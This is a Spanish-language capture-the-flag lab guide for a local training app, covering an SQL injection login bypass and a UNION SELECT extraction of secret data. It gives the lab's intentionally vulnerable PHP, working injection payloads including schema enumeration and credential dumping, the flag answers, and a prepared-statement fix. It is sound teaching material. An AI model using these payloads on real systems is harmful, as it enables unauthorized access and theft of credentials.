---
title: "Lab 1: SQL Injection"
description: Guía práctica del laboratorio de SQL Injection en ULS CyberLab
sidebar:
  order: 21
---

# Lab 1: SQL Injection

**Puntos totales:** 30 pts (10 + 20)  
**Dificultad:** 🟢 Fácil → 🟡 Medio  
**Módulo:** `/index.php` (Challenge 1) y `/modules/sqli.php` (Challenge 2)

---

## Contexto

SQL Injection permite a un atacante **manipular las consultas SQL** que una aplicación envía a su base de datos. En ULS CyberLab, el formulario de login y el módulo de búsqueda son vulnerables porque construyen las queries concatenando directamente la entrada del usuario.

---

## Challenge 1: Login Bypass (10 puntos)

**Flag:** `FLAG{SQL_1NJ3CT10N_M4ST3R}`  
**Módulo:** Formulario de login en `http://localhost/mini-cyberlab/`

### Objetivo

Entrar al sistema **sin conocer ninguna contraseña válida** usando SQL Injection.

### Código Vulnerable

```php
// includes/db.php + index.php
$query = "SELECT id, username, role 
          FROM users 
          WHERE username = '$username' AND password = '$password'";
```

Cuando ingresas `' OR '1'='1` como usuario, la query se convierte en:

```sql
SELECT id, username, role 
FROM users 
WHERE username = '' OR '1'='1' AND password = 'cualquier_cosa'
```

Como `'1'='1'` es siempre verdadero, la condición WHERE se cumple y devuelve el primer usuario de la tabla.

### Paso a Paso

1. Abre `http://localhost/mini-cyberlab/`
2. En el campo **Usuario**, escribe:
   ```
   ' OR '1'='1
   ```
3. En el campo **Contraseña**, escribe cualquier cosa:
   ```
   hacked
   ```
4. Haz clic en **Iniciar Sesión**

### Resultado Esperado

- ✅ Login exitoso como `admin`
- ✅ Flag `FLAG{SQL_1NJ3CT10N_M4ST3R}` capturada automáticamente (10 pts)
- ✅ Log `CRITICAL` registrado en el dashboard

### Variaciones del Payload

```sql
-- Todas estas variaciones deberían funcionar:
' OR 1=1--
' OR '1'='1
" OR "1"="1
' OR 1=1#
admin'--
' OR 1=1 LIMIT 1--
```

### ¿Qué está pasando internamente?

```
Tu input:  ' OR '1'='1
         ↓
Resultado: WHERE username = '' OR '1'='1' AND password = 'x'
                               ↑
         Esta condición siempre es TRUE, bypass exitoso
```

---

## Challenge 2: UNION SELECT (20 puntos)

**Flag:** `FLAG{UN10N_S3L3CT_PR0}`  
**Módulo:** `http://localhost/mini-cyberlab/modules/sqli.php`

### Objetivo

Usar la cláusula `UNION SELECT` para extraer datos de una tabla diferente (`secrets`) a través del parámetro de búsqueda.

### Código Vulnerable

```php
// modules/sqli.php
$search = $_GET['search'];  // Sin sanitizar

$query = "SELECT id, secret_name 
          FROM secrets 
          WHERE secret_name LIKE '%$search%'";

// La query y los resultados se muestran en pantalla
```

### Entender UNION SELECT

`UNION` permite combinar los resultados de dos queries. Para que funcione:
1. Ambas queries deben tener el **mismo número de columnas**
2. Los tipos de datos deben ser **compatibles**

La query original selecciona **2 columnas**: `id` y `secret_name`.

### Paso a Paso

#### Paso 1: Confirmar que es vulnerable

Escribe en el campo de búsqueda:
```
test' OR '1'='1
```

Si muestra todos los registros, es vulnerable.

#### Paso 2: Determinar el número de columnas

```sql
test' ORDER BY 1--
test' ORDER BY 2--
test' ORDER BY 3--   ← Si da error, hay 2 columnas
```

O directamente con UNION NULL:
```sql
test' UNION SELECT NULL,NULL--
```

#### Paso 3: Ejecutar el UNION SELECT

```sql
' UNION SELECT 1,secret_name FROM secrets WHERE '1'='1
```

**URL completa:**
```
http://localhost/mini-cyberlab/modules/sqli.php?search=%27+UNION+SELECT+1%2Csecret_name+FROM+secrets+WHERE+%271%27%3D%271
```

O en el formulario de búsqueda:
```
' UNION SELECT 1,secret_name FROM secrets WHERE '1'='1
```

#### Paso 4: Ver los resultados

La tabla mostrará los datos de `secrets`, incluyendo:
- `api_key: sk_live_ULS_2026_FAKE_API_KEY`
- `admin_token: eyJhbGciOiJIUzI1NiJ9...`
- `hidden_flag: FLAG{UN10N_S3L3CT_PR0}` ← ¡La flag!

### Resultado Esperado

- ✅ La tabla muestra datos de la tabla `secrets`
- ✅ Ves `FLAG{UN10N_S3L3CT_PR0}` en los resultados
- ✅ Flag capturada automáticamente (20 pts)

### Exploración Adicional (Sin puntos, para aprender)

```sql
-- Ver todas las tablas de la base de datos
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='uls_cyberlab'--

-- Ver columnas de la tabla users
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extraer usuarios y contraseñas
' UNION SELECT username,password FROM users WHERE '1'='1
```

:::caution
Recuerda: estos comandos solo funcionan en ULS CyberLab. Usar estas técnicas en sistemas reales sin autorización es **ilegal**.
:::

---

## Mitigación — ¿Cómo Arreglarlo?

### El Problema
```php
// ❌ VULNERABLE - Concatenación directa
$query = "SELECT * FROM users WHERE username = '$username'";
```

### La Solución
```php
// ✅ SEGURO - Prepared Statements
$stmt = $conn->prepare("SELECT id, username, role FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

Con prepared statements, el motor SQL **separa** el código de los datos. Aunque el usuario ingrese `' OR '1'='1`, esto se tratará como un string literal, no como código SQL.

---

## Recursos para Profundizar

- [PortSwigger SQLi Labs (gratuito)](https://portswigger.net/web-security/sql-injection)
- [SQLMap - Herramienta automatizada](https://sqlmap.org/)
- [OWASP SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
